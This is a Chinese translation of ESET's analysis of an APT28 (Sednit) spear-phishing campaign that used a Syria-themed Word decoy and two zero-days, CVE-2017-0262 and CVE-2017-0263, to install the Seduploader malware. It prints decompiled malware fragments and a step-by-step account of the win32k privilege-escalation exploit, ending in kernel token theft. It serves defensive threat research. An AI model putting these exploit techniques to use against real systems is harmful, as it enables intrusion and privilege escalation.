# 【技术分享】APT28组织是如何利用两个0day漏洞影响法国大选的？

阅读量 **175948**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-10 20:09:14

 **x**

##### 译文声明

本文是翻译文章，文章来源：welivesecurity.com

原文地址：<https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

翻译：[ **360代码卫士**](http://bobao.360.cn/member/contribute?uid=2873043487)

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**引言**

**Sednit组织又称APT28、Fancy Bear和Sofacy，是一个至少活跃于2004年且主要以从特定目标窃取机密信息为目标的黑客组织。**
2016年10月， ESET安全公司发表了对该组织所使用网络武器和技术的详细分析报告。

**上个月，APT28组织又闯入人们的视野，被指干扰法国总统大选；更具体点讲，对当时还是候选人的马克龙发动攻击。**
与此同时，一个含有名为“特朗普攻击叙利亚（英文版本）”附件的钓鱼邮件引起了我们的注意。

研究人员分析后发现这个文档的真实作用是释放Sednit组织广为人知的侦察工具Seduploader。为实现这一目的，该组织利用了两个0day利用代码：一是Word远程代码执行漏洞
(CVE-2017-0262)，另外一个是Windows中的本地权限升级漏洞
(CVE-2017-0263)。ESET公司当时将两个漏洞都告知微软，后者在本次常规的补丁星期二中发布了补丁。

这篇文章说明的是这次攻击的情况以及用于感染潜在目标的漏洞。

  

**从一个Word利用代码到Seduploader病毒释放器**

以下图表说明这次攻击跟APT28组织的常规攻击方法一致：使用包含恶意附件的鱼叉式钓鱼邮件来安装第一阶段的有效负载：

这次，这封钓鱼邮件跟特朗普对叙利亚的攻击有关：

受感染附件是一份诱导文档，包含一篇名为《特朗普攻击叙利亚为何是错误的多个原因》、于2017年4月12日发表在《加利福尼亚速递》上的文章。

就是从这里开始，攻击开始变得有意思了。这份诱导文档包含两个用于安装Seduploader的利用，如下：

这两个0day能加到APT28在过去两年中所使用的0day漏洞清单中：

打开这份诱导文档后，文档首先会触发Office
EPS过滤器中的一个漏洞CVE-2017-0262。在这个案例中，这个恶意EPS文件被称为.docx文件中的image1.eps：

这个EPS利用文件通过一个简单的XOR混淆。EPS为XOR变量提供功能然后衡量源
(exec)。这里使用的密钥是一个大的十六进制编码字符串中的0xc45d6491，而exec被解密缓存所调用。

一旦被解密，这个利用看起来跟火眼公司在2015年记录的利用很类似，当时利用的漏洞是CVE-2015-2545。二者之间的主要不同之处如下所示，也就是如何通过forall指令来执行内存损坏。

一旦获取代码执行，它就会加载一个shellcode用于检索未经记录的Windows API如：

    
    
    NtAllocateVirtualMemory, NtFreeVirtualMemory and ZwProtectVirtualMemory
    [...]
     v1 = (*(__readfsdword(0x30u) + 12) + 12);
     v2 = v1->InLoadOrderModuleList.Flink;
     [...]
     for ( addr_user32 = 0; v2 != v1; v135 = v2 )
     {
       v3 = *(v2 + 48);
       v132 = *(v2 + 44);
       if ( v3 )
       {
         v4 = *v3;
         v5 = 0;
         v6 = 0;
         if ( *v3 )
         {
           do
           {
             if ( v132 && v6 >= v132 )
               break;
             if ( (v4 - 0x41) <= 0x19u )
               v4 += 0x20;
             v2 = v135;
             v7 = __ROL4__(v5, 7);
             ++v3;
             v5 = v4 ^ v7;
             v4 = *v3;
             ++v6;
           }
           while ( *v3 );
           v1 = v133;
         }
         switch ( v5 )
         {
           case kernel32:
             addr_kernel32 = *(v2 + 24);
             break;
           case ntdll:
             addr_ntdll = *(v2 + 24);
             break;
           case user32:
             addr_user32 = *(v2 + 24);
             break;
           }
         }
    [...]

多次解密后，这个Seduploader病毒释放器就会被加载并予以执行。注意，这些执行都发生在以当前用户权限运行的WINWORD.EXE进程中。

  

**Seduploader释放器**

Seduploader由两个不同的组件构成：一个病毒释放器和一个持续的有效负载。

虽然用于本次攻击中的病毒释放器自上次分析之后发生了变化，但它的终极目标仍然是一致的即传播Seduploader有效负载。这个病毒释放器的新版本当前包含为CVE-2017-2063整合LPE利用的代码。本文会在后面详细分析这个漏洞；当前，我们主要关注的是Seduploader。

首先，病毒释放器中的新代码会查看进程是在Windows 32位还是64位版本中运行。根据检查结果，正确的利用版本会被加载在内存中：

一旦成功执行利用，Seduploader病毒释放器将会在WINDOWS的内存空间中重新自我加载，并且通过Uploader入口点的地址调用CreateRemoteThread，从而执行负责安装Seduploader有效负载的代码。由于利用的存在，代码会以系统权限身份运行。

  

**Seduploader有效负载**

Seduploader有效负载是APT28操作者使用的被当做侦察恶意软件的下载器，它由两部分组成。第一部分负责将第二部分注入适当的进程中，这取决于它是否加载于WINWORD.EXE进程中。第二部分是下载器本身。

如果Seduploader在WINWORD.EXE中运行，那么它的第一部分会创建一个名为flPGdvyhPykxGvhDOAZnU
的互斥量，并打开当前进程的一个控制。这个控制会被用于分配内存并将有效负载组件的第二部分代码写入，随后通过CreateRemoteThread的调用执行。否则，如果它不在WINWORD.EXE中执行，Seduploader会使用CreateThread启动第二部分。

这个下载器包含一般的Seduploader功能和字符串加密算法。另外它还包含下面提到的一些变化。

首先，用于识别DDL名称和用于解析的API函数的哈希算法被新的算法所替代。之前在白皮书中提到，旧的哈希算法源自Carberp中的代码。而新的算法也并非基于零基础：这次，APT28组织使用了跟PowerSniff非常类似的代码：

接着，Seduploader的报告信息会添加一个新的img标签。这个标签会提取截屏：

    
    
    […]
    keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY, 0u);
    Sleep(1000u);
    keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0u);
    OpenClipboard(0u);
    hData = GetClipboardData(CF_BITMAP);
    CloseClipboard();
    if ( !hData )
      return 0;
    GdiplusStartupInput = (const int *)1;
    v10 = 0;
    v11 = 0;
    v12 = 0;
    GdiplusStartup(&token, &GdiplusStartupInput, 0);
    if ( fGetEncoderClsid((int)L”image/jpeg”, &imageCLSID) )
    {
      v4 = sub_10003C5F((int)hData, 0);
      ppstm = 0;
      CreateStreamOnHGlobal(0u, 1u, &ppstm);
      v5 = GdipSaveImageToStream(v4[1], ppstm, &imageCLSID, 0);
      if ( v5 )
        v4[2] = v5;
      (*(void (__thiscall **)(_DWORD *, signed int))*v4)(v4, 1);
      IStream_Size(ppstm, &pui);
      cb = pui.s.LowPart;
      v7 = ppstm;
      *a1 = pui.s.LowPart;
      IStream_Reset(v7);
      v1 = j_HeapAlloc(cb);
      IStream_Read(ppstm, v1, cb);
      ppstm->lpVtbl->Release(ppstm);
    }
    GdiplusShutdown(token);
    return v1;
    }

跟平常一样，APT28黑客组织也没有重新建轮子。我们发现它执行截屏函数和stackoverflow论坛上的代码存在一些相似指出。它并没有使用GetForegroundWindow来检索当前用户工作的前台窗口的控制，而是选择使用keybd_event来发送一个”Print
screen”按键并随后从剪贴板检索图片。这个图片基于64位编码并被加到如下格式的报告结构中：

    
    
    * “import win32api;print hex(win32api.GetVolumeInformation(“C:\”)[1])”的结果。
    ** HKLMSYSTEMCurrentControlSetServicesDiskEnum的内容
    ***当SEDUPLOADER使用注入连接到互联网时触发

APT28组织此前就曾使用过截屏。过去这个功能被在后期注入阶段构建于通常由Xtunnel触发的单独的工具中，不过现在在Seduploader的侦察阶段所构建使用。

最后，两个新函数被添加到配置中：shell和LoadLib。这个shell配置能让攻击者直接在内存中执行任意代码，而LoadLib能让通过调用rund1132.exe运行任意DLL的一个位字段。

  

**CVE-2017-0263—本地权限升级**

**利用工作流**

如上所述，为了部署Seduploader有效负载，Seduploader病毒释放器通过利用一个LPE漏洞CVE-2017-0263获取了系统权限。本部分我们将会说明APT28黑客组织是如何利用这个漏洞的。

首先，即使这个漏洞影响Windows 7及以上版本（见文末受影响平台清单），但这个漏洞旨在避开在Windows 8.1及以上版本中运行。

由于这个利用能同时针对32位和64位平台，它首先会判断这个进程是否在WOW64下运行。这个利用会分配多个页面直到找到一个高数值地址
(0x02010000)。随后它会构建如下结构：

    
    
    struct Payload
     {
       LONG PTEAddress;               // Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+
       LONG pid;                      // Injected process pid;
       LONG offset_of_lpszMenuName;   // Offset of the lpszMenuName in the win32k!tagCLS structure
       LONG offset_of_tagTHREADINFO;  // Offset of the pti field in the win32k!tagWND structure.
       LONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.
       LONG offset_of_TOKEN;          // Offset of the Token field in the nt!_EPROCESS structure.
       LONG tagCLS[0x100];            // Array containing the tagCLS of the created windows.
       LONG WndProcCode;              // Code of the WndProc meant to be run in kernel mode.
     };

随后，它将检索HMValidateHandle的地址。这个功能能让攻击者泄露一个tagWND对象的内核地址。

如下概览了余下利用如何运作：

这个利用将会创建256个随机视窗类别以及相关视窗。每个视窗将会有512个外加存储器。这个额外内存临近内核空间的tagWND对象。在第一个创建的视窗后也就是在外加存储器中，这个利用会构建一个包含多数只有它自己的地址随后才会使用的虚假对象，如下所示：

当所有的视窗都创建好之后，这个利用会分配2个额外的视窗。第一个视窗的作用是在内核线程中执行：我们姑且将这个视图称作KernelWnd，而另外一个主要是接收完成这个利用所需要的必要信息：我们姑且将这个视窗称作TargetWindow。然后，这个利用会关联带有新分配对象KernelWnd的程序。

    
    
    // …
    TargetWindow = CreateWindowExW(0x80088u, MainWindowClass, 0, WS_VISIBLE, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
    KernelWnd = CreateWindowExW(0, MainWindowClass, 0, 0, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
    // …
    SetWindowLongW(KernelWnd, GWL_WNDPROC, (LONG)Payload_0->WndProc);

我们在win32k组件的行为中添加一些上下文。每次你通过CreateWindowExW创建一个新窗口时，驱动都会在内核中创建一个新的tagWND对象。这个对象可描述为（为清晰起见，删除了一些字段）：

    
    
    kd> dt tagWND
     win32k!tagWND
       +0x000 head             : _THRDESKHEAD
       +0x028 state            : Uint4B
       // ...
       +0x028 bServerSideWindowProc : Pos 18, 1 Bit
       // ...
       +0x042 fnid             : Uint2B
       +0x048 spwndNext        : Ptr64 tagWND
       +0x050 spwndPrev        : Ptr64 tagWND
       +0x058 spwndParent      : Ptr64 tagWND
       +0x060 spwndChild       : Ptr64 tagWND
       +0x068 spwndOwner       : Ptr64 tagWND
       +0x070 rcWindow         : tagRECT
       +0x080 rcClient         : tagRECT
       +0x090 lpfnWndProc      : Ptr64     int64
       +0x098 pcls             : Ptr64 tagCLS
       // ...

从中可看出，tagWND->lpfnWindowProc包含跟这个视窗相关联的程序地址。这个驱动通常会降级其权限在用户上下文中执行这个程序。该行为是由位
tagWND->bServerSideProc控制的。如果这个位被设置，那么这个程序会通过升级权限进行运行，也就是在内核中运行。通过翻转tagWND->bServerSideProc位，利用就会运行。攻击者所需要做的就是找到翻转的方式。

在破坏目录的过程中，前面设置的钩子会查看对象的类别是否是如下代码块中所示的SysShadow。如是，则它会用自己的程序替代关联程序。

    
    
     GetClassNameW(tagCWPSTRUCT->hwnd, &ClassName, 20);
     if ( !wcscmp(&ClassName, STR_SysShadow) )
     {
       if ( ++MenuIndex == 3 )
       {
         // tagWND
         ::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);
         // Replace the WndProc of the object
         SetWindowLongW(tagCWPSTRUCT->hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);
       }

在这个程序中，我们可发现这个利用在寻找WM_NCDESTROY信息。如果要求符合，那么它会构建一个由如下伪码说明的恶意tagPOPUPMENU对象：

    
    
    if ( Msg == WM_NCDESTROY )
     {
       struct tagPOPUPMENU *pm = BuildFakeObject();
       SetClassLongW(..., pm);
     }

注意，用于构建这个对象的地址存在于我们首个tagWND末尾分配的外加存储器中。随后，这个利用会调用 NtUserMNDragLeave来翻转
KernelWnd对象的bServerSideProc位。为此，这个函数会检索使用tagTHREADINFO结构的一个tagMENUSTATE对象。这个对象包含被毁灭的菜单对象地址
(tagMENUSTATE->pGlobalPopupMenu)。

可看出，tagPOPUPMENU
是我们在调用NtUserMNDragLeave前在用户空间中编制的恶意对象。查看恶意tagPOPUPMENU的字段就能发现它们都指向外加存储器，但有一个例外，它指向了我们的KernelWnd对象。

从这里我们可发现，执行会到达函数MNFreePopup，它会将指针指向一个tagPOPUPMENU
对象。最终这个函数会调用HMAssignmentUnlock，将字段 spwndNextPopup 和spwndPrevPopup作为参数传递：

    
    
    ; win32k!HMAssignmentUnlock
     sub     rsp,28h
     mov     rdx,qword ptr [rcx]
     and     qword ptr [rcx],0
     test    rdx,rdx
     je      win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
     add     dword ptr [rdx+8],0FFFFFFFFh ; Flipping bServerSideProc
     jne     win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
     movzx   eax,word ptr [rdx]

执行这个系统调用后，我们的tagWND结构会跟我们的KernelWnd进行如下关联：

一切设置就绪！这个利用只需要发送正确的信息就能以内核模式触发程序执行。

    
    
    syscall(NtUserMNDragLeave, 0, 0);
     // Send a message to the procedure in order to trigger its execution in kernel mode.
     KernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0);
     Status.Triggered = KernelCallbackResult == 0x9F9F;
     if ( KernelCallbackResult != 0x9F9F )
       // Error, try again.
       PostMessageW(TargetWindow, 0xABCDu, 0, 0);

最后，以升级权限运行的视窗程序会窃取SYSTEM口令并将其添加到调用进程。成功运行这个利用后，FLTLDR.EXE应该会以系统权限运行，并将会安装Seduploader的有效负载。

  

**总结**

这次攻击表明APT28并未停止攻击活动。他们仍然“旧习难改”：使用已知的攻击方法、复用来自其它恶意软件或公开站点的代码并犯一些小错误如在Seduploader的配置（shel而不是shell）的输入错误。

不变的事实还有，他们再次改进了工具集，比如这次添加了一些内置功能如截屏器并将两个0day利用整合到网络武器中。

  

**微软发布的受CVE-2017-0262和CVE-2017-0263影响的平台**

**CVE-2017-0262**

Microsoft Office 2010 Service Pack 2 （32位版本）

Microsoft Office 2010 Service Pack 2 （64位版本）

Microsoft Office 2013 Service Pack 1 （32位版本）

Microsoft Office 2013 Service Pack 1 （64位版本）

Microsoft Office 2013 RT Service Pack 1

Microsoft Office 2016 （32位版本）

Microsoft Office 2016（64位版本）

**CVE-2017-0263**

Windows 7 for 32-bit Systems Service Pack 1

Windows 7 for x64-based Systems Service Pack 1

Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
installation)

Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1

Windows Server 2008 R2 for x64-based Systems Service Pack 1

Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
installation)

Windows Server 2012

Windows Server 2012 (Server Core installation)

Windows 8.1 for 32-bit systems

Windows 8.1 for x64-based systems

Windows Server 2012 R2

Windows RT 8.1

Windows Server 2012 R2 (Server Core installation)

Windows 10 for 32-bit Systems

Windows 10 for x64-based Systems

Windows 10 Version 1511 for x64-based Systems

Windows 10 Version 1511 for 32-bit Systems

Windows Server 2016

Windows 10 Version 1607 for 32-bit Systems

Windows 10 Version 1607 for x64-based Systems

Windows Server 2016 (Server Core installation)

Windows 10 Version 1703 for 32-bit Systems

Windows 10 Version 1703 for x64-based Systems

Windows Server 2008 for Itanium-Based Systems Service Pack 2

Windows Server 2008 for 32-bit Systems Service Pack 2

Windows Server 2008 for x64-based Systems Service Pack 2<

Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
installation)

  

**IoC（攻陷指标）**

  

**互斥量**

flPGdvyhPykxGvhDOAZnU

  

**注册表键**

    
    
    HKCUSoftwareMicrosoftOffice testSpecialPerf

本文翻译自welivesecurity.com
[原文链接](https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **奇安信代码卫士** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86063](/post/id/86063)

安全客 - 有思想的安全新媒体

本文转载自: [welivesecurity.com](https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/)

如若转载,请注明出处： <https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhimg.com/t015a32ce3696fa7636.png) 奇安信代码卫士

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

